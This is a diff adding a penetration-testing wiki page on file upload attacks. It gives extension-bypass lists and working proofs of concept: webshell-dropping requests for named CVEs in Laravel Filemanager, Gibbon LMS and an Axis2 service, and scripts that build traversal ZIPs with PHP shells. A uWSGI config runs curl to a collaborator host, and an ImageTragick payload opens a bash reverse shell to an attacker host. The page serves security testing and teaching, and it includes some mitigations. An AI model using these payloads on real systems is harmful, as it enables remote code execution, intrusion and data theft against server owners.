@@ -1,0 +1,602 @@
+# File Upload
+
+{{#include ../../banners/hacktricks-training.md}}
+
+## File Upload General Methodology
+
+Other useful extensions:
+
+- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
+  - **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
+- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
+- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
+- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
+- **Flash**: _.swf_
+- **Perl**: _.pl, .cgi_
+- **Erlang Yaws Web Server**: _.yaws_
+
+### Bypass file extensions checks
+
+1. If they apply, the **check** the **previous extensions.** Also test them using some **uppercase letters**: _pHp, .pHP5, .PhAr ..._
+2. _Check **adding a valid extension before** the execution extension (use previous extensions also):_
+   - _file.png.php_
+   - _file.png.Php5_
+3. Try adding **special characters at the end.** You could use Burp to **bruteforce** all the **ascii** and **Unicode** characters. (_Note that you can also try to use the **previously** motioned **extensions**_)
+   - _file.php%20_
+   - _file.php%0a_
+   - _file.php%00_
+   - _file.php%0d%0a_
+   - _file.php/_
+   - _file.php.\\_
+   - _file._
+   - _file.php...._
+   - _file.pHp5...._
+4. Try to bypass the protections **tricking the extension parser** of the server-side with techniques like **doubling** the **extension** or **adding junk** data (**null** bytes) between extensions. _You can also use the **previous extensions** to prepare a better payload._
+   - _file.png.php_
+   - _file.png.pHp5_
+   - _file.php#.png_
+   - _file.php%00.png_
+   - _file.php\x00.png_
+   - _file.php%0a.png_
+   - _file.php%0d%0a.png_
+   - _file.phpJunk123png_
+5. Add **another layer of extensions** to the previous check:
+   - _file.png.jpg.php_
+   - _file.php%00.png%00.jpg_
+6. Try to put the **exec extension before the valid extension** and pray so the server is misconfigured. (useful to exploit Apache misconfigurations where anything with extension** _**.php**_**, but** not necessarily ending in .php** will execute code):
+   - _ex: file.php.png_
+7. Using **NTFS alternate data stream (ADS)** in **Windows**. In this case, a colon character ":” will be inserted after a forbidden extension and before a permitted one. As a result, an **empty file with the forbidden extension** will be created on the server (e.g. "file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The "**::$data**” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "file.asp::$data.”)
+8. Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php
+
+   ```
+   # Linux maximum 255 bytes
+   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
+   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
+   # Upload the file and check response how many characters it alllows. Let's say 236
+   python -c 'print "A" * 232'
+   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+   # Make the payload
+   AAA<--SNIP 232 A-->AAA.php.png
+   ```
+
+#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546
+
+Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:
+
+- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
+- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
+- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).
+
+Minimal PoC (Burp Repeater):
+
+```http
+POST /profile/avatar HTTP/1.1
+Host: target
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="upload"; filename="0xdf.php."
+Content-Type: image/png
+
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
+------WebKitFormBoundary--
+```
+
+Then hit the saved path (typical in Laravel + LFM):
+
+```
+GET /storage/files/0xdf.php?cmd=id
+```
+
+### Bypass Content-Type, Magic Number, Compression & Resizing
+
+- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
+  1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
+- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
+  `exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
+  `\` or you could also **introduce the payload directly** in an image:\
+  `echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
+- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
+  - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
+- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
+  - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
+- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
+  - [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)
+
+### Other Tricks to check
+
+- Find a vulnerability to **rename** the file already uploaded (to change the extension).
+- Find a **Local File Inclusion** vulnerability to execute the backdoor.
+- **Possible Information disclosure**:
+  1. Upload **several times** (and at the **same time**) the **same file** with the **same name**
+  2. Upload a file with the **name** of a **file** or **folder** that **already exists**
+  3. Uploading a file with **"." , "..", or "…" as its name**. For instance, in Apache in **Windows**, if the application saves the uploaded files in "/www/uploads/" directory, the "." filename will create a file called 
+  uploads” in the "/www/" directory.
+  4. Upload a file that may not be deleted easily such as **"…:.jpg"** in **NTFS**. (Windows)
+  5. Upload a file in **Windows** with **invalid characters** such as `|<>*?”` in its name. (Windows)
+  6. Upload a file in **Windows** using **reserved** (**forbidden**) **names** such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
+- Try also to **upload an executable** (.exe) or an **.html** (less suspicious) that **will execute code** when accidentally opened by victim.
+
+### Special extension tricks
+
+If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
+If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).
+
+The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)
+
+The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.
+
+## **Jetty RCE**
+
+If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!
+
+![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)
+
+## **uWSGI RCE**
+
+For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).
+
+Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.
+
+Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
+
+```ini
+[uwsgi]
+; read from a symbol
+foo = @(sym://uwsgi_funny_function)
+; read from binary appended data
+bar = @(data://[REDACTED])
+; read from http
+test = @(http://[REDACTED])
+; read from a file descriptor
+content = @(fd://[REDACTED])
+; read from a process stdout
+body = @(exec://whoami)
+; curl to exfil via collaborator
+extra = @(exec://curl http://collaborator-unique-host.oastify.com)
+; call a function returning a char *
+characters = @(call://uwsgi_func)
+```
+
+The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.
+
+It's crucial to understand the lax nature of uWSGI's configuration file parsing. Specifically, the discussed payload can be inserted into a binary file (such as an image or PDF), further broadening the scope of potential exploitation.
+
+### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)
+
+Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.
+
+- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
+- Method: POST
+- Required params:
+  - `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
+  - `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
+  - `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)
+
+Minimal PoC to write and read back a file:
+
+```bash
+# Prepare test payload
+printf '0xdf was here!' | base64
+# => MHhkZiB3YXMgaGVyZSEK
+
+# Write poc.php via unauth POST
+curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
+  -d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'
+
+# Verify write
+curl http://target/Gibbon-LMS/poc.php
+```
+
+Drop a minimal webshell and execute commands:
+
+```bash
+# '<?php system($_GET["cmd"]); ?>' base64
+# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==
+
+curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
+  -d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'
+
+curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
+```
+
+Notes:
+- The handler performs `base64_decode($_POST["img"])` after splitting by `;` and `,`, then writes bytes to `$absolutePath . '/' . $_POST['path']` without validating extension/type.
+- Resulting code runs as the web service user (e.g., XAMPP Apache on Windows).
+
+References for this bug include the usd HeroLab advisory and the NVD entry. See the References section below.
+
+## **wget File Upload/SSRF Trick**
+
+In some occasions you may find that a server is using **`wget`** to **download files** and you can **indicate** the **URL**. In these cases, the code may be checking that the extension of the downloaded files is inside a whitelist to assure that only allowed files are going to be downloaded. However, **this check can be bypassed.**\
+The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"*232+".php"**.
+
+```bash
+#Create file and HTTP server
+echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
+python3 -m http.server 9080
+```
+
+```bash
+#Download the file
+wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
+The name is too long, 240 chars total.
+Trying to shorten...
+New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
+--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
+Connecting to 127.0.0.1:9080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 10 [image/gif]
+Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s
+
+2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
+```
+
+Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.
+
+### Escaping upload directory via NTFS junctions (Windows)
+
+(For this attack you will need local access to the Windows machine) When uploads are stored under per-user subfolders on Windows (e.g., C:\Windows\Tasks\Uploads\<id>\) and you control creation/deletion of that subfolder, you can replace it with a directory junction pointing to a sensitive location (e.g., the webroot). Subsequent uploads will be written into the target path, enabling code execution if the target interprets server‑side code.
+
+Example flow to redirect uploads into XAMPP webroot:
+
+```cmd
+:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
+::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
+
+:: 2) Remove the created folder and create a junction to webroot
+rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
+cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs
+
+:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
+::    Minimal PHP webshell for testing
+::    <?php echo shell_exec($_REQUEST['cmd']); ?>
+
+:: 4) Trigger
+curl "http://TARGET/shell.php?cmd=whoami"
+```
+
+Notes
+- mklink /J creates an NTFS directory junction (reparse point). The web server’s account must follow the junction and have write permission in the destination.
+- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
+- Defenses: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.
+
+### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)
+
+Some upload/ingest handlers write the raw request body to a filesystem path that is constructed from user-controlled query parameters. If the handler also supports Content-Encoding: gzip and fails to canonicalize/validate the destination path, you can combine directory traversal with a gzipped payload to write arbitrary bytes into a web-served directory and obtain RCE (e.g., drop a JSP under Tomcat’s webapps).
+
+Generic exploitation flow:
+- Prepare your server-side payload (e.g., minimal JSP webshell) and gzip-compress the bytes.
+- Send a POST where a path parameter (e.g., token) contains traversal escaping the intended folder, and file indicates the filename to persist. Set Content-Type: application/octet-stream and Content-Encoding: gzip; the body is the compressed payload.
+- Browse to the written file to trigger execution.
+
+Illustrative request:
+
+```http
+POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
+Host: target
+Content-Type: application/octet-stream
+Content-Encoding: gzip
+Content-Length: <len>
+
+<gzip-compressed-bytes-of-your-jsp>
+```
+
+Then trigger:
+
+```http
+GET /jsp/shell.jsp?cmd=id HTTP/1.1
+Host: target
+```
+
+Notes
+- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
+- Burp Suite’s Hackvertor extension can produce a correct gzip body from your payload.
+- This is a pure pre-auth arbitrary file write → RCE pattern; it does not rely on multipart parsing.
+
+Mitigations
+- Derive upload destinations server-side; never trust path fragments from clients.
+- Canonicalize and enforce that the resolved path stays within an allow-listed base directory.
+- Store uploads on a non-executable volume and deny script execution from writable paths.
+
+### Axis2 SOAP uploadFile traversal to Tomcat webroot (JSP drop)
+
+Axis2-based upload services sometimes expose an `uploadFile` SOAP action that takes three attacker-controlled fields: `jobDirectory` (destination directory), `archiveName` (filename), and `dataHandler` (base64 file content). If `jobDirectory` is not canonicalized, you get arbitrary file write via path traversal and can land a JSP in Tomcat’s webapps.
+
+Minimal request outline (default creds often work: `admin` / `trubiquity`):
+
+```http
+POST /services/WsPortalV6UpDwAxis2Impl HTTP/1.1
+Host: 127.0.0.1
+Content-Type: text/xml
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:updw="http://updw.webservice.ddxPortalV6.ddxv6.procaess.com">
+  <soapenv:Body>
+    <updw:uploadFile>
+      <updw:login>admin</updw:login>
+      <updw:password>trubiquity</updw:password>
+      <updw:archiveName>shell.jsp</updw:archiveName>
+      <updw:jobDirectory>/../../../../opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/</updw:jobDirectory>
+      <updw:dataHandler>PD8lQCBwYWdlIGltcG9ydD0iamF2YS5pby4qIjsgc3lzdGVtKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7Pz4=</updw:dataHandler>
+    </updw:uploadFile>
+  </soapenv:Body>
+</soapenv:Envelope>
+```
+
+- Bindings are often localhost-only; pair with a full-read SSRF (absolute-URL request line, Host header ignored) to reach `127.0.0.1` if the Axis2 port isn’t exposed.
+- After writing, browse to `/trufusionPortal/jsp/shell.jsp?cmd=id` to execute.
+
+## Tools
+
+- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.
+
+### Corrupting upload indices with snprintf quirks (historical)
+
+Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.
+
+## From File upload to other vulnerabilities
+
+- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
+- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
+- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
+- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
+- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
+- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
+- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
+- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
+- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
+- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
+- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
+- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
+- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
+- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
+- Check if there is any **size limit** uploading files
+
+Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):
+
+1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
+2. **SVG**: Stored XSS / SSRF / XXE
+3. **GIF**: Stored XSS / SSRF
+4. **CSV**: CSV injection
+5. **XML**: XXE
+6. **AVI**: LFI / SSRF
+7. **HTML / JS** : HTML injection / XSS / Open redirect
+8. **PNG / JPEG**: Pixel flood attack (DoS)
+9. **ZIP**: RCE via LFI / DoS
+10. **PDF / PPTX**: SSRF / BLIND XXE
+
+#### Burp Extension
+
+
+{{#ref}}
+https://github.com/portswigger/upload-scanner
+{{#endref}}
+
+## Magic Header Bytes
+
+- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
+- **JPG**: `"\xff\xd8\xff"`
+
+Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.
+
+## Zip/Tar File Automatically decompressed Upload
+
+If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:
+
+### Symlink
+
+Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
+
+```
+ln -s ../../../index.php symindex.txt
+zip --symlinks test.zip symindex.txt
+tar -cvf test.tar symindex.txt
+```
+
+### Decompress in different folders
+
+The unexpected creation of files in directories during decompression is a significant issue. Despite initial assumptions that this setup might guard against OS-level command execution through malicious file uploads, the hierarchical compression support and directory traversal capabilities of the ZIP archive format can be exploited. This allows attackers to bypass restrictions and escape secure upload directories by manipulating the decompression functionality of the targeted application.
+
+An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). The utility can be used as shown:
+
+```python
+# Listing available options
+python2 evilarc.py -h
+# Creating a malicious archive
+python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
+```
+
+Additionally, the **symlink trick with evilarc** is an option. If the objective is to target a file like `/flag.txt`, a symlink to that file should be created in your system. This ensures that evilarc does not encounter errors during its operation.
+
+Below is an example of Python code used to create a malicious zip file:
+
+```python
+#!/usr/bin/python
+import zipfile
+from io import BytesIO
+
+
+def create_zip():
+    f = BytesIO()
+    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
+    z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
+    z.writestr('otherfile.xml', 'Content of the file')
+    z.close()
+    zip = open('poc.zip','wb')
+    zip.write(f.getvalue())
+    zip.close()
+
+create_zip()
+```
+
+**Abusing compression for file spraying**
+
+For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)
+
+1.  **Creating a PHP Shell**: PHP code is written to execute commands passed through the `$_REQUEST` variable.
+
+    ```php
+    <?php
+    if(isset($_REQUEST['cmd'])){
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+    }?>
+    ```
+
+2.  **File Spraying and Compressed File Creation**: Multiple files are created and a zip archive is assembled containing these files.
+
+    ```bash
+    root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
+    root@s2crew:/tmp# zip cmd.zip xx*.php
+    ```
+
+3.  **Modification with a Hex Editor or vi**: The names of the files inside the zip are altered using vi or a hex editor, changing "xxA" to "../" to traverse directories.
+
+    ```bash
+    :set modifiable
+    :%s/xxA/../g
+    :x!
+    ```
+
+### ZIP NUL-byte filename smuggling (PHP ZipArchive confusion)
+
+When a backend validates ZIP entries using PHP’s ZipArchive but extraction writes to the filesystem using raw names, you can smuggle a disallowed extension by inserting a NUL (0x00) into the filename fields. ZipArchive treats the entry name as a C‑string and truncates at the first NUL; the filesystem writes the full name, dropping everything after the NUL.
+
+High-level flow:
+- Prepare a legitimate container file (e.g., a valid PDF) that embeds a tiny PHP stub in a stream so the magic/MIME stays a PDF.
+- Name it like `shell.php..pdf`, zip it, then hex‑edit the ZIP local header and central directory filename to replace the first `.` after `.php` with `0x00`, resulting in `shell.php\x00.pdf`.
+- Validators that rely on ZipArchive will “see” `shell.php .pdf` and allow it; the extractor writes `shell.php` to disk, leading to RCE if the upload folder is executable.
+
+Minimal PoC steps:
+```bash
+# 1) Build a polyglot PDF containing a tiny webshell (still a valid PDF)
+printf '%s' "%PDF-1.3\n1 0 obj<<>>stream\n<?php system($_REQUEST["cmd"]); ?>\nendstream\nendobj\n%%EOF" > embedded.pdf
+
+# 2) Trick name and zip
+cp embedded.pdf shell.php..pdf
+zip null.zip shell.php..pdf
+
+# 3) Hex-edit both the local header and central directory filename fields
+#    Replace the dot right after ".php" with 00 (NUL) => shell.php\x00.pdf
+#    Tools: hexcurse, bless, bvi, wxHexEditor, etc.
+
+# 4) Local validation behavior
+php -r '$z=new ZipArchive; $z->open("null.zip"); echo $z->getNameIndex(0),"\n";'
+# -> shows truncated at NUL (looks like ".pdf" suffix)
+```
+
+Notes
+- Change BOTH filename occurrences (local and central directory). Some tools add an extra data descriptor entry too – adjust all name fields if present.
+- The payload file must still pass server‑side magic/MIME sniffing. Embedding the PHP in a PDF stream keeps the header valid.
+- Works where the enum/validation path and the extraction/write path disagree on string handling.
+
+### Stacked/concatenated ZIPs (parser disagreement)
+
+Concatenating two valid ZIP files produces a blob where different parsers focus on different EOCD records. Many tools locate the last End Of Central Directory (EOCD), while some libraries (e.g., ZipArchive in specific workflows) may parse the first archive they find. If validation enumerates the first archive and extraction uses another tool that honors the last EOCD, a benign archive can pass checks while a malicious one gets extracted.
+
+PoC:
+```bash
+# Build two separate archives
+printf test > t1; printf test2 > t2
+zip zip1.zip t1; zip zip2.zip t2
+
+# Stack them
+cat zip1.zip zip2.zip > combo.zip
+
+# Different views
+unzip -l combo.zip   # warns about extra bytes; often lists entries from the last archive
+php -r '$z=new ZipArchive; $z->open("combo.zip"); for($i=0;$i<$z->numFiles;$i++) echo $z->getNameIndex($i),"\n";'
+```
+
+Abuse pattern
+- Create a benign archive (allowed type, e.g., a PDF) and a second archive containing a blocked extension (e.g., `shell.php`).
+- Concatenate them: `cat benign.zip evil.zip > combined.zip`.
+- If the server validates with one parser (sees benign.zip) but extracts with another (processes evil.zip), the blocked file lands in the extraction path.
+
+## ImageTragic
+
+Upload this content with an image extension to exploit the vulnerability **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
+
+```
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
+pop graphic-context
+```
+
+## Embedding PHP Shell on PNG
+
